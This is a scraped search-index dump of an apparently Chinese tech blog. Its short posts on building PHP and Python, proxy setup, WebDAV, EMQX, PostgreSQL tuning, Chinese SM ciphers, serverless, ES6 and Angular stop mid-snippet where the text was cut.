script1yum install -y libacl libacl-devel libxml2 libxml2-devel openssl openssl-devel bzip2 bzip2-devel libcurl libcurl-devel enchant enchant-devel gd gd-devel gmp gmp-devel libmcrypt libmcrypt-devel libtidy libtidy-devel libxslt libxslt-devel argon2 libargon2-devel libtidy libtidy-devel gcc gcc-c++ autoconf automake zlib zlib-devel pcre-devel 如果是 debain 或 ubuntu 下执行安装 script1apt-get install libacl1 libacl1-dev libxml2 libxml2-dev libbz2-dev libcurl3 libcurl3-dev enchant libenchant-dev libjpeg-dev libpng-dev libxpm-dev libfreetype6-dev libgmp-dev libgmp3-dev libmcrypt-dev libtidy-dev libxslt-dev libssl-dev libargon2-0 libargon2-0-dev build-essential libpcre3 libpcre3-dev autoconf zlib1g-dev 使用 Debian x86 版本出现 GMP 错误，则需要手动建立软链接 script1ln -s /usr/include/x86_64-linux-gnu/gmp.h /usr/include/gmp.h 准备编译源码 PHP 官网 下载需要的版本源码，建议使用最新稳定版本 将准备好的源码包解压，进入到 php 源码目录下 配置安装默认下，可以直接使用执行，但是很多模块是不包含在内的 script1./configure 为了减少以后再次配置编译，以下这些配置都是我们常用到的 script123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354./configure \\ --disable-debug \\ --disable-rpath \\ --enable-fpm \\ --with-fpm-user=nginx \\ --with-fpm-group=nginx \\ --with-fpm-acl \\ --with-libxml-dir \\ --with-openssl \\ --with-kerberos \\ --with-pcre-regex \\ --with-zlib \\ --enable-bcmath \\ --with-bz2 \\ --enable-calendar \\ --with-curl \\ --enable-dba \\ --with-enchant \\ --enable-exif \\ --disable-fileinfo \\ --with-pcre-dir \\ --enable-ftp \\ --with-gd \\ --with-jpeg-dir \\ --with-png-dir \\ --with-zlib-dir \\ --with-xpm-dir \\ --with-freetype-dir \\ --with-gettext \\ --with-gmp \\ --with-mhash \\ --enable-mbstring \\ --enable-mbregex \\ --with-mysqli \\ --enable-embedded-mysqli \\ --with-mysql-sock=/tmp/mysql.sock \\ --enable-pcntl \\ --with-pdo-mysql \\ --enable-session \\ --enable-shmop \\ --enable-soap \\ --enable-sockets \\ --enable-sysvsem \\ --with-tidy \\ --enable-wddx \\ --with-xmlrpc \\ --enable-xml \\ --with-iconv-dir \\ --with-xsl \\ --enable-zip \\ --enable-mysqlnd \\ --without-pear \\ --enable-shared \\ --with-password-argon2 执行后，配置检测无误就可以编译与安装了 1# make &amp;&amp; make install 环境配置到 /usr/local/etc 修改 php-fpm.conf 文件 12345;pool name ('www' here)[nginx]user = nginxgroup = nginxinclude=/usr/local/etc/php-fpm.d/*.conf","link":"/ops/php_build/"},{"title":"安装非默认 Python3","text":"Python 是一个非常实用的工具，在 Linux 中存在不少应用会依赖于系统默认的 Python，但是在一些老的发行版本中系统默认的 Python 往往版本较低不能兼容一些新的特性，因此需要实现系统默认 Python3 与自定义 Python3.x 的共存共用 以 Debian 系统为例首先安装构建 Python 源代码所需的软件包： 12sudo apt updatesudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev curl libbz2-dev 从 Python download page 下载源码包，当前版本为 3.8.5 开始解压 1tar -xf Python-3.8.5.tar.xz 进入目录，执行编译检测，--enable-optimizations 选项将通过运行多个测试来优化 Python 二进制文件，这将使构建过程变慢 12cd Python-3.8.5./configure --enable-optimizations 运行 make 开始构建过程，可以增加多线程编译 -j [CPU核数] 提速 1make 构建完成后，使用该命令安装 Python；请不要使用 make install 因为它将覆盖系统默认的 Python3，导致依赖它的软件包工作异常 1make altinstall 安装成功后将以 python3.8 pip3.8 呈现 12python3.8 --versionpip3.8","link":"/ops/python_install/"},{"title":"Window 终端设置 UTF8","text":"CMD 设置 首先，win+R --&gt; regedit 打开注册表 在路径 计算机\\HKEY_CURRENT_USER\\Console\\%SystemRoot%_system32_cmd.exe 中找到 CodePage 数据数值修改为 0000fde9 PowerShell 设置 创建一个 PowerShell 配置文件，打开 PowerShell 执行 New-Item $PROFILE -ItemType File -Force 修改创建的配置文件 Microsoft.PowerShell_profile.ps1，加入内容 1[System.Console]::OutputEncoding=[System.Text.Encoding]::GetEncoding(65001) !&gt; 无法加载文件 X:\\Users...\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1，因为在此系。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。 修改 PowerShell 的执行策略 Execution Policy，执行 Set-ExecutionPolicy Unrestricted","link":"/knowledge/window_utf8/"},{"title":"终端设置代理","text":"Git 客户端设置代理使用 Git 执行 script12git config --global http.proxy http://127.0.0.1:1080git config --global https.proxy http://127.0.0.1:1080 Linux 平台方法 1在终端中直接运行命令，这个办法的好处是简单直接，并且影响面很小（只对当前终端有效，退出就不行了） script1export http_proxy=http://proxyAddress:port 如果你用的是 ss 代理，在当前终端运行以下命令，那么 wget curl 这类网络命令都会经过 ss 代理 script1export ALL_PROXY=socks5://127.0.0.1:1080 方法 2把代理服务器地址写入 .bashrc 或者 .zshrc ，添加下面内容 script12export http_proxy=&quot;http://localhost:port&quot;export https_proxy=&quot;http://localhost:port&quot; 以使用 shadowsocks 代理为例，ss 的代理端口为 1080 ，那么应该设置为 script12export http_proxy=&quot;socks5://127.0.0.1:1080&quot;export https_proxy=&quot;socks5://127.0.0.1:1080&quot; 或者直接设置 ALL_PROXY script1export ALL_PROXY=socks5://127.0.0.1:1080 或者通过设置 alias 简写来简化操作，每次要用的时候输入 setproxy，不用了就 unsetproxy script123alias setproxy=&quot;export ALL_PROXY=socks5://127.0.0.1:1080&quot;alias unsetproxy=&quot;unset ALL_PROXY&quot;alias ip=&quot;curl -i http://ip.cn&quot; 方法 3改相应工具的配置，比如 apt 的配置 script1sudo vim /etc/apt/apt.conf 在文件末尾加入下面这行 1Acquire::http::Proxy &quot;http://proxyAddress:port&quot; 保存 apt.conf 文件即可 方法 4利用 proxychains 在终端使用 socks5 代理，proxychains 安装 script123456git clone https://github.com/rofl0r/proxychains-ng.gitcd proxychains-ng./configuremake &amp;&amp; make installcp ./src/proxychains.conf /etc/proxychains.confcd .. &amp;&amp; rm -rf proxychains-ng 编辑 proxychains 配置 script1vim /etc/proxychains.conf 将 socks4 127.0.0.1 9095 改为（默认的 socks4 127.0.0.1 9095 是 tor 代理，而 socks5 127.0.0.1 1080 是 shadowsocks 的代理） 1socks5 127.0.0.1 1080 proxychains.conf 文件说明了代理配置格式,在需要代理的命令前加上 proxychains4 1proxychains4 wget http://xxx.com/xxx.zip Window 平台使用管理员打开 powershell，在终端中手动执行 script1netsh winhttp set proxy &quot;127.0.0.1:1080&quot;","link":"/knowledge/proxy/"},{"title":"搭建 Satis 私有 Packagist","text":"使用 composer 初始化 Satis 项目 1# composer create-project composer/satis --keep-vcs 删除默认 composer.lock，重新安装依赖 12# composer install# composer dump-autoload --optimize 配置 satis.json 12345678910111213141516171819202122232425262728{ &quot;name&quot;: &quot;My Repository&quot;, &quot;homepage&quot;: &quot;http://localhost:8001&quot;, &quot;repositories&quot;: [ { &quot;type&quot;: &quot;composer&quot;, &quot;url&quot;: &quot;https://packagist.laravel-china.org&quot; }, { &quot;type&quot;: &quot;vcs&quot;, &quot;url&quot;: &quot;git@github.com:kainonly/anyone.git&quot; } ], &quot;require-all&quot;: false, &quot;require&quot;: { &quot;topthink/think&quot;: &quot;5.1.*&quot;, &quot;topthink/think-captcha&quot;: &quot;^2.0&quot;, &quot;topthink/think-image&quot;: &quot;^1.0&quot;, &quot;overtrue/wechat&quot;: &quot;~4.0&quot;, &quot;aliyuncs/oss-sdk-php&quot;: &quot;^2.3&quot;, &quot;phpseclib/phpseclib&quot;: &quot;^2.0&quot;, &quot;kain/think-bit&quot;: &quot;^1.4&quot;, &quot;lcobucci/jwt&quot;: &quot;^3.2&quot;, &quot;doctrine/collections&quot;: &quot;^1.5&quot;, &quot;nesbot/carbon&quot;: &quot;^2.5&quot;, &quot;php-amqplib/php-amqplib&quot;: &quot;^2.8&quot;, &quot;ajaxray/short-code&quot;: &quot;^1.1&quot;, &quot;ramsey/uuid&quot;: &quot;^3.8&quot;, &quot;kain/anyone&quot;: &quot;^1.0&quot; }} homepage 在 satis 上显示的默认私有镜像地址 repositories 需要被索引的 git 代码仓库地址 require-all 索引全网的 php 包 require 明确定义包名可以减少索引内容中使用 创建索引 1# php bin/satis build satis.json ./public 在项目初始 package.json，name:satis-server，并安装 browser-sync 12# npm init# npm install browser-sync --save 创建 js 文件：satis-server.js 12345678910const bs = require(&quot;browser-sync&quot;).create();bs.init({ host: &quot;127.0.0.1&quot;, ui: false, watch: true, server: &quot;./public&quot;, port: 8001, browser: [],}); 使用 pm2 守护运行 123# pm2 start satis-server.js# pm2 save# pm2 startup","link":"/ops/satis/"},{"title":"PostgreSQL 优化","text":"POSTGRESQL 参数 选项 默认值 说明 是否优化 原因 max_connections 100 允许客户端连接的最大数目 否 因为在测试的过程中，100 个连接已经足够 fsync on 强制把数据同步更新到磁盘 是 因为系统的 IO 压力很大，为了更好的测试其他配置的影响，把改参数改为 off shared_buffers 24MB 决定有多少内存可以被 PostgreSQL 用于缓存数据（推荐内存的 1/4，不超过内存的 1/2) 是 在 IO 压力很大的情况下，提高该值可以减少 IO work_mem 1MB 使内部排序和一些复杂的查询都在这个 buffer 中完成，不够要适可而止，每个连接都要用这么大的 是 有助提高排序等操作的速度，并且减低 IO effective_cache_size 128MB 优化器假设一个查询可以用的最大内存，和 shared_buffers 无关（推荐内存的 1/2) 是 设置稍大，优化器更倾向使用索引扫描而不是顺序扫描 maintenance_work_mem 16MB 这里定义的内存只是被 VACUUM 等耗费资源较多的命令调用时使用 是 把该值调大，能加快命令的执行 wal_buffer 768kB 日志缓存区的大小 是 可以降低 IO，如果遇上比较多的并发短事务，应该和 commit_delay 一起用 checkpoint_segments 3 设置 wal log 的最大数量数（一个 log 的大小为 16M） 是 默认的 48M 的缓存是一个严重的瓶颈，基本上都要设置为 10 以上 checkpoint_completion_target 0.5 表示 checkpoint 的完成时间要在两个 checkpoint 间隔时间的 N%内完成 是 能降低平均写入的开销 commit_delay 0 事务提交后，日志写到 wal log 上到 wal_buffer 写入到磁盘的时间间隔。需要配合 commit_sibling 是 能够一次写入多个事务，减少 IO，提高性能 commit_siblings 5 设置触发 commit_delay 的并发事务数，根据并发事务多少来配置 是 减少 IO，提高性能 POSTGRESQL 扩展 EXTEND NAME SQL UUID create extension “uuid-ossp”;","link":"/database/postgresql/"},{"title":"PHP CURL 证书问题","text":"如出现该错误, 未正确配置 CA 证书 1curl: (60) SSL certificate : unable to get local issuer certificate 下载证书 http://curl.haxx.se/ca/cacert.pem, 配置 php.ini 1curl.cainfo = &quot;/usr/local/php/cacert.pem&quot;","link":"/backend/php_curl/"},{"title":"Redis 故障","text":"错误信息 12If you get this error Can't save in background: fork: Cannot allocate memoryit means that your current database is bigger than memory you have. 解决方式是开启 vm.overcommit_memory 1# sysctl vm.overcommit_memory=1","link":"/database/redis_faq/"},{"title":"EMQ X 容器持久化","text":"EMQX 容器持久化需要将以下目录挂载处理： /opt/emqx/data /opt/emqx/etc /opt/emqx/lib /opt/emqx/log 假设为 EMQX 配置 compose 编排： 12345678910111213141516171819202122version: &quot;3.7&quot;services: emqx: image: emqx/emqx restart: always environment: EMQX_NAME: emqx EMQX_HOST: 127.0.0.1 EMQX_ALLOW_ANONYMOUS: &quot;false&quot; EMQX_LISTENER__TCP__EXTERNAL: 1883 EMQX_LISTENER__WS__EXTERNAL: 8083 EMQX_DASHBOARD__DEFAULT_USER__LOGIN: root EMQX_DASHBOARD__DEFAULT_USER__PASSWORD: 123456 ports: - 1883:1883 - 8083:8083 - 8081:8081 volumes: - ./emqx/lib:/opt/emqx/lib - ./emqx/etc:/opt/emqx/etc - ./emqx/data:/opt/emqx/data - ./emqx/log:/opt/emqx/log 此时，编排的容器不能成功运行，并提示： 12emqx_1 | cat: can't open '/opt/emqx/etc/emqx.conf': No such file or directoryemqx_1 | ls: /opt/emqx/etc/plugins: No such file or directory 因此我们要让容器正常的运行起来，首先要屏蔽挂载配置，重新编排 12345678910111213141516171819202122version: &quot;3.7&quot;services: emqx: image: emqx/emqx restart: always environment: EMQX_NAME: emqx EMQX_HOST: 127.0.0.1 EMQX_ALLOW_ANONYMOUS: &quot;false&quot; EMQX_LISTENER__TCP__EXTERNAL: 1883 EMQX_LISTENER__WS__EXTERNAL: 8083 EMQX_DASHBOARD__DEFAULT_USER__LOGIN: root EMQX_DASHBOARD__DEFAULT_USER__PASSWORD: 123456 ports: - 1883:1883 - 8083:8083 - 8081:8081 # volumes: # - ./emqx/lib:/opt/emqx/lib # - ./emqx/etc:/opt/emqx/etc # - ./emqx/data:/opt/emqx/data # - ./emqx/log:/opt/emqx/log 将文件从容器中复制出来，$CONTAINER 换成该容器的 ID： 1234docker cp $CONTAINER:/opt/emqx/data ./emqx/docker cp $CONTAINER:/opt/emqx/etc ./emqx/docker cp $CONTAINER:/opt/emqx/lib ./emqx/docker cp $CONTAINER:/opt/emqx/log ./emqx/ 为其设置权限，需要对应的用户 ID 为 1000 12chown -R kain:kain ./emqxchmod -R 755 ./emqx 解除屏蔽的挂载配置，重新编排 1emqx_1 | EMQ X Broker 4.1.4 is running now! 经测试，为 EMQX 增加配置后，删除容器再重新创建持久化生效，容器运行正常","link":"/ops/emqx_build/"},{"title":"WebDav 快速使用","text":"WebDAV ，全称是 Web-based Distributed Authoring and Versioning，维基百科上对它的解释是这样的：基于 Web 的分布式编写和版本控制（WebDAV）是超文本传输协议（HTTP）的扩展，有利于用户间协同编辑和管理存储在万维网服务器文档。 使用原因类似技术，我们常见的是文件传输协议(FTP)，他在 RFC 959 中定义，于 1985 年 10 月发布，被设计成为一个跨平台的、简单且易于实现的协议。但时至今日，却已江河日下，因为存在一些历史问题，大致以一下几点： 密码安全策略不完善 与防火墙工作不协调 无法对操作进行细化处理 效率不高，速度较慢 与 FTP 相比，WebDAV 具有以下优点： 通过一个 TCP 连接，可以更轻松地将其配置为绕过防火墙，NAT 和代理。 在 FTP 中，数据通道可能会导致正确的 NAT 设置出现问题。 同样，由于一个 TCP 连接可以持久，因此在传输许多小文件时，WebDAV 将比 FTP 快一点-无需为每个文件建立数据连接。 GZIP 压缩是 HTTP 的标准，但不是 FTP 的标准（是的，FTP 中提供了 MODE Z，但未在任何标准中定义）。 HTTP 有很多未在 FTP 中定义的身份验证方法。 例如。 NTLM 和 Kerberos 身份验证在 HTTP 和 FTP 中很常见，除非您同时编写 FTP 的客户端和服务器端，否则很难获得对它们的适当支持。 WebDAV 支持部分传输，在 FTP 中无法部分上传（即，您不能覆盖文件中间的块）。 因此 WebDAV 是一个替代 FTP 不错的方案 安装目前 Apache 和 Nginx 均支持 WebDAV，可作为 WebDAV 文件共享服务器软件，但这里推荐使用 https://github.com/hacdias/webdav，基于 Go 语言实现，不仅跨平台，还支持 ARM 架构，可在㠌入式设备中部署 WebDAV 服务器。 首先下载对应的执行程序 webdav ，然后创建配置文件 webdav.yml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# 地址address: 0.0.0.0# 端口port: 991# 用户验证auth: true# 开启TLStls: false# 证书与密钥cert: cert.pemkey: key.pem# 访问前缀prefix: /# 用户默认配置，自动合并# 作用路径scope: .# 是否允许修改modify: true# 规则rules: []# 跨域设置cors: enabled: true credentials: true allowed_headers: - Depth allowed_hosts: - http://localhost:8080 allowed_methods: - GET exposed_headers: - Content-Length - Content-Range# 用户定义users: - username: admin password: admin scope: /a/different/path - username: encrypted password: &quot;{bcrypt}$2y$10$zEP6oofmXFeHaeMfBNLnP.DO8m.H.Mwhd24/TOX2MWLxAExXi4qgi&quot; - username: &quot;{env}ENV_USERNAME&quot; password: &quot;{env}ENV_PASSWORD&quot; - username: basic password: basic modify: false rules: - regex: false allow: false path: /some/file - path: /public/access/ modify: true 开始运行 1webdav -c ./webdav.yml 守护运行测试后可将其加入进程守护，首先准备： 12345# 迁入用户执行cp webdav /usr/local/binchmod +x /usr/local/bin/webdav# 规范配置路径cp webdav.yml /opt/webdav 创建 webdav.service 在 /etc/systemd/system 目录中： 123456789101112[Unit]Description=WebDAV serverAfter=network.target[Service]Type=simpleUser=rootExecStart=/usr/local/bin/webdav --config /opt/webdav/webdav.ymlRestart=on-failure[Install]WantedBy=multi-user.target 启动服务，并加入自启 12systemctl enable webdavsystemctl start webdav","link":"/ops/webdav/"},{"title":"国密算法","text":"国密即国家密码局认定的国产密码算法。主要有 SM1，SM2，SM3，SM4。密钥长度和分组长度均为 128 位。 SM1 对称加密其加密强度与 AES 相当。该算法不公开，调用该算法时，需要通过加密芯片的接口进行调用。采用该算法已经研制了系列芯片、智能 IC 卡、智能密码钥匙、加密卡、加密机等安全产品，广泛应用于电子政务、电子商务及国民经济的各个应用领域（包括国家政务通、警务通等重要领域）。 SM2 为非对称加密该算法已公开，由于该算法基于 ECC，故其签名速度与秘钥生成速度都快于 RSA。ECC 256 位（SM2 采用的就是 ECC 256 位的一种）安全强度比 RSA 2048 位高，但运算速度快于 RSA。 SM2 椭圆曲线公钥密码算法是我国自主设计的公钥密码算法，包括 SM2-1 椭圆曲线数字签名算法，SM2-2 椭圆曲线密钥交换协议，SM2-3 椭圆曲线公钥加密算法，分别用于实现数字签名密钥协商和数据加密等功能。SM2 算法与 RSA 算法不同的是，SM2 算法是基于椭圆曲线上点群离散对数难题，相对于 RSA 算法，256 位的 SM2 密码强度已经比 2048 位的 RSA 密码强度要高。 SM3 消息摘要可以用 MD5 作为对比理解，该算法已公开，校验结果为 256 位 SM3 杂凑算法是我国自主设计的密码杂凑算法，适用于商用密码应用中的数字签名和验证消息认证码的生成与验证以及随机数的生成，可满足多种密码应用的安全需求。为了保证杂凑算法的安全性，其产生的杂凑值的长度不应太短，例如 MD5 输出 128 比特杂凑值，输出长度太短，影响其安全性。SHA-1 算法的输出长度为 160 比特，SM3 算法的输出长度为 256 比特，因此 SM3 算法的安全性要高于 MD5 算法和 SHA-1 算法。 SM4 对称加密线局域网标准的分组数据算法，密钥长度和分组长度均为 128 位。 SM4 分组密码算法是我国自主设计的分组对称密码算法，用于实现数据的加密/解密运算，以保证数据和信息的机密性。要保证一个对称密码算法的安全性的基本条件是其具备足够的密钥长度，SM4 算法与 AES 算法具有相同的密钥长度分组长度 128 比特，因此在安全性上高于 3DES 算法。","link":"/knowledge/sm/"},{"title":"Serverless：这真的是未来吗？","text":"许多说所有应用程序都将是无服务器的应用程序的人并未大规模运行其应用程序，也未解决与延迟、复杂性和供应商锁定有关的所有问题。这就是我们在这里要谈论的。 作者：Serverless 社区链接：https://juejin.cn/post/6963874301154066468 供应商锁定怎么办？你有多关心厂商锁定问题？例如：你很可能无法将 AWS 中的无服务器架构转移到另一个云提供商。有些组织不关心厂商锁定问题，但很多组织关心。如果你真的在乎，那么在你继续前进之前，请决定你应该在乎多少。 您的组织有多大？无服务器对于较年轻的组织或较小的组织来说是一个很好的选择，也许大型组织中的新手团队直接关注于交付价值。一旦组织发展到足够大，可以支持专门管理基础设施的团队了，并且使用率增长了，可能就该重新评估情况了。成功采用无服务器平台的大型组织往往是经历了文化转变才获得成功。如果您还没有准备好在组织的所有级别上进行大量投资，以使无服务器的采用获得成功，那么使用更传统的方法（由专门的团队控制供应基础设施）可能更合适。 最后，正如在前一篇文章中所讨论的，大型企业可能想要考虑构建一个基础设施平台，在那里像 Kubernetes 这样的技术可以受益。 架构是什么样的呢？需要考虑的一点是无服务器的产品和更”传统”的方法在思维方式上的显著差异，这意味着当切换平台时，应用程序可能经常需要重新设计。您可能需要考虑这些体系结构更改的 ROI 是什么。通常，从时间和财务的角度来看，任何应用程序的重新设计都是昂贵的，甚至会给最成功的工程团队带来问题。 无论您是在开发一个新开发的应用程序还是评估一个现有的应用程序，考虑无服务器应用程序的架构都是很重要的。传统的 N 层风格的体系结构或 N 层风格的 web 应用程序需要大量的投资才能迁移到无服务器的平台。 总结总而言之，无服务器并不能解决所有问题，但是在正确的地方可以提供很多服务。请记住以下问题： 您有多在乎供应商锁定？ 无服务器架构不能简单地从一个云提供商迁移到另一家云提供商。您的组织在多大程度上关心供应商锁定？ 您的组织规模是多大？ 无服务器通常更适合小型组织。一旦有了 IT 员工来支持它，您可能想看看更传统的选择。大型企业可能希望研究 Kubernetes。 您是否比提供应用程序透明性更关心快速提供价值？ 如果您希望尽快将应用程序推向市场，那么无服务器可能是一个不错的选择。但是，您将牺牲应用程序的指标和洞察力。随着规模的增长，这可能会导致真正的问题。 您了解应用程序的属性吗？ 通常说无服务器可以省钱，因为您只需为使用时间付费。但是，如果您的应用程序具有较长的响应或启动时间，请仔细观察。无服务器可能是一个昂贵的选择。 您的应用程序的体系结构是什么样的？ 不要期望传统的端层风格的体系结构能够很好地与无服务器的应用程序配合使用。寻找可以分解成更小的组件一起工作的应用程序。另一方面，将无服务器应用程序迁移到您控制的服务器也需要重新构建应用程序。你有时间和人去做吗？ 无服务器是绕过 IT 的一种方法吗？ 使用无服务器作为绕过 IT 部门的方法可能不是最好的主意。编写不合规且容易受到攻击的代码太容易了。相反，请使用 DevOps 方法并与所有利益相关者会面以提出解决方案。 安全性如何？ 无服务器架构的安全性存在问题。云提供商提供了一些现成的选项，例如 Amazon GuardDuty，但是它们可能有很多限制，限制了无服务器提供的灵活性。实现安全的无服务器应用程序需要大量的思考。","link":"/backend/serverless-2/"},{"title":"容易被忽略的ES6方法","text":"熟练并广泛使用 ES6 语法，能够帮助我们在面对复杂应用时，仍可以写出稳健、规范、高效的代码，大大提升开发效率。 除了常用的 let、const、箭头函数和 Promise 对象外，es6 还有很多能够提升开发效率，但容易被忽视的语法： 作者：Cxx链接：https://jelly.jd.com/article/604f04069c61f9014c21ad81 返回数值的整数部分最容易想到的是 parseInt、Math.floor()、Math.ceil()、Math.round()，parseInt 方法是先将内容转换成 Number 类型，再进行取整，这样对于数值类型的值的话会有额外的开销，而 Math.floor() 和 Math.ceil() 对于正数和负数的取整要看情况使用。 es6 提供 Math.trunc 方法 123const a = Math.trunc(-3.1);// 输出b：-3 虽然 Math.trunc 内部也是使用 Number 方法将其先转为数值，但对比 parseInt，Math.trunc 在数字极大或者极小，自动采用科学计数法时不会出错： 1234const a = parseInt(3.111e22);const b = Math.trunc(3.111e22);// 输出a：3// 输出b：3.111e22 数组去重最常用的方法就是双层循环判断：外层循环元素，内层循环对比，通过 splice 来删除重复的元素；或者就是外层 for 循环，利用语法自身键不可重复性（比如 indexOf）来实现。总之，不管怎样都需要一小段代码来实现，不是很简便。 es6 提供 Array.from(new Set(arr))： 123const a = [1, 2, 3, 3, 2];const b = Array.from(new Set(a));// 输出b：[1,2,3] Array.from() 从一个类似数组或可迭代对象中创建一个新的，浅拷贝的数组实例 new Set() 允许你存储任何类型的唯一值 同时通过拓展运算符 ... 可以实现多个数组的合并且去重： 1234const a = [1, 2, 3];const b = [2, 3, 4];const c = Array.from(new Set([...a, ...b]));// 输出c：[1,2,3,4] 判断数组中是否存在某一元素常规方法是使用 indexOf ，通过对比元素的出现位置来判断是否存在 123const a = [1, 2, 3];const b = a.indexOf(2);// 输出b：1 es6 提供 Array.prototype.includes： 123const a = [1, 2, 3];const b = a.includes(2);// 输出b：true 同时，includes 还有第二个参数，表示搜索的起始位置，如果第二个参数为负数，则表示倒数的位置： 12const a = [1, 2, 3].includes(3, -1);// 输出a：true 如果这时它大于数组长度（比如第二个参数为 -4，但数组长度为 3），则会重置为从 0 开始。 相比于 indexOf，includes 的语义化更强，由于其内部不是使用严格的相等运算符（===）进行判断，因此不会导致对 NaN 的误判： 1234const a = [NaN].indexOf(NaN);// 输出：-1const b = [NaN].includes(NaN);// 输出b：true 数组 find() 与 findIndex() 方法如果要找出一个数组中第一个小于 0 的数或者索引，首先想到的可能是用循环遍历，将查到的值赋值给一个变量 es6 提供 find()与 findIndex()方法： 12345const a = [1, -1, 2, 3];const b = a.find((item) =&gt; { return item &lt; 0;});// 输出b：-1 链判断运算符在项目开发中，我们经常会遇到要取结构深层数据的情况，下面的一行代码就在所难免： 1const price = data.result.redPacket.price; 那么当某一个 key 不存在时，undefined.key 就会报错，通常我们会优化成下面的样子： 123456const price = (data &amp;&amp; data.result &amp;&amp; data.result.redPacket &amp;&amp; data.result.redPacket.price) || &quot;default&quot;; es6 提供链判断运算符： 1const price = data?.result?.redPacket?.price || &quot;default&quot;; 这样即使某一个 key 不存在，也不会报错，只会返回 undefined 1234a?.b; // 等同于 a == null ? undefined : a.ba?.[x]; // 等同于 a == null ? undefined : a[x]a?.b(); // 等同于 a == null ? undefined : a.b()a?.(); // 等同于 a == null ? undefined : a() Object.assignObject.assign 用于对象的合并，需要注意的是 Object.assign 是浅拷贝，而不是深拷贝，它也可以用于处理数组，但是会把数组当成对象来处理，即会把对应相同的 key 的值替换掉： 12const a = Object.assign([1, 2, 3], [4, 5]);// 输出a：[4,5,3] SymbolES6 引入了一种新的原始数据类型 Symbol，表示独一无二的值，不会与其他属性名产生冲突，即使两个声明完全一样，也是不相等的： 1234const a = Symbol();const b = Symbol();a === b;// 输出：false 开发中，为了区分一种业务逻辑下的不同场景，我们通常会定义几个唯一的常量来区分。比如要区分抽奖弹框在中优惠券、中京豆和中实物奖下的弹框样式，最常用的就是定义 type 分别为 coupon、jbean、award： 1234567891011121314151617const POPUP_COUPON = &quot;coupon&quot;;const POPUP_JBEAN = &quot;jbean&quot;;const POPUP_AWARD = &quot;award&quot;;switch (result.type) { case POPUP_COUPON: show(result); break; case POPUP_JBEAN: show(result); break; case POPUP_AWARD: show(result); break; default: break;} 我们把上面定义的 3 个常量叫做“魔术字符串”（“魔法字符串”：指的是，在代码中多次出现、与代码形成强耦合的某一个具体的字符串或数值。——阮一峰），不利于后期代码的维护和修改。其实我们可以发现 POPUP_COUPON 具体是什么值并不重要，只要能够唯一区分就行，这个时候就可以考虑使用 Symbol： 123const POPUP_COUPON = Symbol();const POPUP_JBEAN = Symbol();const POPUP_AWARD = Symbol(); 这样就没有额外需要维护的内容 Proxy 和 Reflectes6 新增的代理 Proxy 和反射 Reflect 在日常开发中用到的比较少，一般用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种“元编程”（meta programming），即对编程语言进行编程。 在 Vue3.0 中，响应式数据部分弃用了 Object.defineProperty，使用 Proxy 来代替它，主要是因为使用 Object.defineProperty 检测不到对象属性的添加和删除，同时当 data 中数据较多且层级很深的时候，会有性能问题，因为要遍历 data 中所有的数据，并将其设置成响应式： 123456789101112131415161718192021222324252627282930313233343536373839404142434445const obj = { name: &quot;cxx&quot;, age: 18, a: { b: 1, },};class Observer { constructor(data) { for (let key of Object.keys(data)) { if (typeof data[key] === &quot;Object&quot;) { data[key] = new Observer(data[key]); } Object.defineProperty(this, key, { enumerable: true, configurable: true, get() { console.log(&quot;get 你访问了&quot; + key); return data[key]; }, set(val) { console.log(&quot;set 你设置了&quot; + key); console.log(&quot;新的&quot; + key + &quot;=&quot; + val); if (val === data[key]) { return; } data[key] = val; }, }); } }}const app = new Observer(obj);console.log(&quot;1----&quot;, app.a.b);// get 你访问了a// 1---- 1app.age = 20;// set 你设置了age// 新的age=20console.log(&quot;2----&quot;, app.age);// get 你访问了age// 2---- 20app.newPropKey = &quot;新属性&quot;;console.log(&quot;3----&quot;, app.newPropKey);// 3---- 新属性 可以看到，给对象添加新属性 newPropKey 时，内部并没有监听到，它只能监听到已经存在的属性，新增属性需要通过 Vue.set 手动再次添加 下面使用 Proxy 替代 Object.defineProperty 实现： 12345678910111213141516171819202122232425262728293031323334const obj = { name: &quot;cxx&quot;, age: 18, a: { b: 1, },};const p = new Proxy(obj, { get(target, propKey, receiver) { console.log(&quot;你访问了&quot; + propKey); return Reflect.get(target, propKey, receiver); }, set(target, propKey, val, receiver) { console.log(&quot;set 你设置了&quot; + propKey); console.log(&quot;新的&quot; + propKey + &quot;=&quot; + val); Reflect.set(target, propKey, val, receiver); },});console.log(&quot;1----&quot;, p.a.b);// 你访问了a// 1---- 1p.age = 20;// set 你设置了age// 新的age=20console.log(&quot;2----&quot;, p.age);// 你访问了age// 2---- 20p.newPropKey = &quot;新属性&quot;;// set 你设置了newPropKey// 新的newPropKey=新属性console.log(&quot;3----&quot;, p.newPropKey);// 你访问了newPropKey// 3---- 新属性 可以看到，这个时候，新增的属性 newPropKey 并不需要重新添加响应式处理，就能很轻松地添加到对象上。因为 Object.defineProperty 只能劫持对象的属性，在监听数据时，新增的属性并不存在，自然不会有 getter, setter，视图也不会得到更新，而 Proxy 可以劫持整个对象，不需要做特殊处理","link":"/front-end/es6_note/"},{"title":"Angular 之 ng-content","text":"ng-content 可以创建类似于 div span 等内部可以插入元素的组件，比如下面的 app-ng-content-simple 他的作用和 span 一样 作者：哈雷链接：https://zhuanlan.zhihu.com/p/39486706 12345678910@Component({ selector: &quot;app-ng-content-simple&quot;, template: &quot;&lt;ng-content&gt;&lt;/ng-content&gt;&quot;, styleUrls: [&quot;./ng-content-simple.component.sass&quot;],})export class NgContentSimpleComponent implements OnInit { constructor() {} ngOnInit() {}} 用法 1&lt;app-ng-content-simple&gt; I am a simple ng content &lt;/app-ng-content-simple&gt; ng-content 指令有一个 [select] 输入，使用方式如同 css selector, 可以对包含的内容进行过滤展示。以下例子展示了标签，属性，css 类选择性地展示内容。 123456789101112131415@Component({ selector: &quot;app-ng-content-select&quot;, template: ` &lt;ng-content&gt;&lt;/ng-content&gt; &lt;ng-content select=&quot;span&quot;&gt;&lt;/ng-content&gt; &lt;ng-content select=&quot;[attribute]&quot;&gt;&lt;/ng-content&gt; &lt;ng-content select=&quot;.class&quot;&gt;&lt;/ng-content&gt; `, styleUrls: [&quot;./ng-content-select.component.sass&quot;],})export class NgContentSelectComponent implements OnInit { constructor() {} 